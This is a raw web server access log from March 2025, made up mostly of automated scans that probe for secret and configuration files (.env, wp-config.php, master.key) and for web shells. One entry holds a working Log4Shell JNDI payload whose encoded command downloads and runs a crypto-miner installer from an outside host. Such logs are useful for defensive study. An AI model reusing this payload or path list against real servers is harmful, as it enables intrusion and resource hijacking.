43.156.111.154 - - [03/Mar/2025:21:24:08 +0800] "HEAD /settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:10 +0800] "HEAD /django_settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:12 +0800] "HEAD /app/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:13 +0800] "HEAD /mysite/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:15 +0800] "HEAD /project/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:18 +0800] "HEAD /config/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:24 +0800] "HEAD /django/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:26 +0800] "HEAD /application/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:28 +0800] "HEAD /myapp/settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:32 +0800] "HEAD /local_settings.py HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:34 +0800] "HEAD /env1 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:36 +0800] "HEAD /env2 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:37 +0800] "HEAD /env3 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:38 +0800] "HEAD /env4 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:40 +0800] "HEAD /env5 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:42 +0800] "HEAD /.env1 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:45 +0800] "HEAD /.env2 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:47 +0800] "HEAD /.env3 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:50 +0800] "HEAD /.env4 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:50 +0800] "HEAD /.env5 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:51 +0800] "HEAD /ini.ini HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:54 +0800] "HEAD /env.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:56 +0800] "HEAD /php.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:57 +0800] "HEAD /.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:24:59 +0800] "HEAD /logs HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:00 +0800] "HEAD /.logs HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:02 +0800] "HEAD /config/database.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:05 +0800] "HEAD /config/mail.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:09 +0800] "HEAD /config/services.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:11 +0800] "HEAD /vendor/autoload.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:14 +0800] "HEAD /public/env HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:14 +0800] "HEAD /artisan HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:16 +0800] "HEAD /public/index.php~ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:18 +0800] "HEAD /config/app.php.bak HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:26 +0800] "HEAD /config/api.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:27 +0800] "HEAD /application/config/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:29 +0800] "HEAD /config/database.yml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:30 +0800] "HEAD /config/environments/production.rb HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:33 +0800] "HEAD /config/secrets.yml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:34 +0800] "HEAD /config/initializers/secrets.yml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:37 +0800] "HEAD /config/master.key HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:38 +0800] "HEAD /config/credentials.yml.enc HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:40 +0800] "HEAD /config/storage.yml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:43 +0800] "HEAD /config/auth.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:44 +0800] "HEAD /config/cache.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:46 +0800] "HEAD /config/session.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:47 +0800] "HEAD /config/queue.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:49 +0800] "HEAD /config/broadcasting.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:53 +0800] "HEAD /config/filesystems.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:56 +0800] "HEAD /config/view.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:56 +0800] "HEAD /config/logging.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:57 +0800] "HEAD /config/cors.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:25:59 +0800] "HEAD /config/hashing.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:02 +0800] "HEAD /.env.example HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:06 +0800] "HEAD /.env.local HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:08 +0800] "HEAD /.env.dev HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:11 +0800] "HEAD /.env.testing HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:13 +0800] "HEAD /.env.production HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:16 +0800] "HEAD /config/database.php.bak HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:17 +0800] "HEAD /database/database.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:19 +0800] "HEAD /app/config/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:21 +0800] "HEAD /app/config/database.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:23 +0800] "HEAD /includes/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:24 +0800] "HEAD /system/config/database.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:27 +0800] "HEAD /config/settings.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:29 +0800] "HEAD /db-config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:30 +0800] "HEAD /web.config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:33 +0800] "HEAD /site/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:34 +0800] "HEAD /conf/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:36 +0800] "HEAD /blog/wp-config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:40 +0800] "HEAD /local/config/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:41 +0800] "HEAD /src/Config/config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:43 +0800] "HEAD /config/parameters.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
43.156.111.154 - - [03/Mar/2025:21:26:45 +0800] "HEAD /config/secrets.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
46.19.143.26 - - [03/Mar/2025:21:46:16 +0800] "GET / HTTP/1.1" 301 5 "-" "-"
124.71.151.239 - - [03/Mar/2025:21:59:34 +0800] "POST /wp-cron.php?doing_wp_cron=1741010374.1451458930969238281250 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
204.188.228.96 - - [03/Mar/2025:21:59:34 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.96 - - [03/Mar/2025:21:59:34 +0800] "GET /form.html HTTP/1.1" 404 409 "-" "curl/8.1.2"
204.188.228.96 - - [03/Mar/2025:21:59:35 +0800] "GET /upl.php HTTP/1.1" 404 409 "-" "Mozilla/5.0"
204.188.228.96 - - [03/Mar/2025:21:59:35 +0800] "GET /t4 HTTP/1.1" 404 409 "-" "Mozilla/5.0"
204.188.228.96 - - [03/Mar/2025:21:59:36 +0800] "GET /geoip/ HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.96 - - [03/Mar/2025:21:59:36 +0800] "GET /favicon.ico HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.96 - - [03/Mar/2025:21:59:37 +0800] "GET /1.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.96 - - [03/Mar/2025:21:59:37 +0800] "GET /systembc/password.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.96 - - [03/Mar/2025:21:59:38 +0800] "GET /password.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.144.212.139 - - [03/Mar/2025:22:25:37 +0800] "GET /.git/refs/tags/ HTTP/1.1" 404 409 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/67.0.3396.69 Mobile/16A366 Safari/604.1"
59.89.180.15 - - [03/Mar/2025:22:29:42 +0800] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.171.245.223 - - [03/Mar/2025:22:38:46 +0800] "GET /portal/redlion HTTP/1.1" 404 409 "-" "Mozilla/5.0 zgrab/0.x"
124.71.151.239 - - [03/Mar/2025:23:05:56 +0800] "POST /wp-cron.php?doing_wp_cron=1741014356.3334269523620605468750 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
130.211.96.179 - - [03/Mar/2025:23:05:56 +0800] "GET / HTTP/1.1" 200 17031 "-" "python-requests/2.32.3"
152.32.215.56 - - [03/Mar/2025:23:15:08 +0800] "GET / HTTP/1.1" 200 81564 "-" "curl/7.29.0"
40.77.167.8 - - [03/Mar/2025:23:20:03 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
185.242.226.153 - - [03/Mar/2025:23:31:30 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
204.76.203.15 - - [03/Mar/2025:23:40:22 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.91.127.9 - - [03/Mar/2025:23:43:16 +0800] "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29 HTTP/1.1" 404 409 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')"
120.46.90.142 - - [03/Mar/2025:23:52:26 +0800] "GET /wp-admin/load-scripts.php?c=0&amp;load%5Bchunk_0%5D=clipboard HTTP/1.1" 200 31 "https://124.71.151.239/wp-admin/load-scripts.php?c=0&amp;load%5Bchunk_0%5D=clipboard" "Mozilla/5.0 (Linux; Android 11; Pro Build/RKQ2.200567.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.145 Mobile Safari/537.36"
124.71.151.239 - - [03/Mar/2025:23:52:30 +0800] "POST /wp-cron.php?doing_wp_cron=1741017150.5116460323333740234375 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
199.45.155.73 - - [03/Mar/2025:23:52:30 +0800] "GET / HTTP/1.1" 301 5 "-" "curl, Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
116.205.96.31 - - [03/Mar/2025:23:53:42 +0800] "GET /wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=clipboard HTTP/1.1" 200 3395 "https://124.71.151.239/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=clipboard" "Mozilla/5.0 (Linux; Android 11; Pro Build/RKQ2.200567.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.145 Mobile Safari/537.36"
120.46.90.142 - - [03/Mar/2025:23:57:14 +0800] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons HTTP/1.1" 200 36736 "https://124.71.151.239/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons" "Mozilla/5.0 (Linux; Android 11; Pro Build/RKQ2.200567.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.145 Mobile Safari/537.36"
52.81.165.141 - - [04/Mar/2025:00:09:16 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/539.35 (KHTML, like Gecko) Chrome/106.0.1349 Safari/537.36"
52.81.165.141 - - [04/Mar/2025:00:09:17 +0800] "GET /favicon.ico HTTP/1.1" 404 409 "-" "Go-http-client/1.1"
52.81.165.141 - - [04/Mar/2025:00:09:17 +0800] "GET /sitemap.xml HTTP/1.1" 404 409 "-" "Go-http-client/1.1"
52.81.165.141 - - [04/Mar/2025:00:09:17 +0800] "GET /robots.txt HTTP/1.1" 404 409 "-" "Go-http-client/1.1"
109.236.61.115 - - [04/Mar/2025:00:09:20 +0800] "GET / HTTP/1.1" 301 5 "-" "Hello World"
193.68.89.10 - - [04/Mar/2025:00:30:13 +0800] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
114.35.175.166 - - [04/Mar/2025:00:32:38 +0800] "GET / HTTP/1.0" 301 0 "-" "curl/7.88.1"
124.71.151.239 - - [04/Mar/2025:01:11:47 +0800] "POST /wp-cron.php?doing_wp_cron=1741021907.3801059722900390625000 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
220.132.201.229 - - [04/Mar/2025:01:11:47 +0800] "GET / HTTP/1.0" 301 0 "-" "curl/7.88.1"
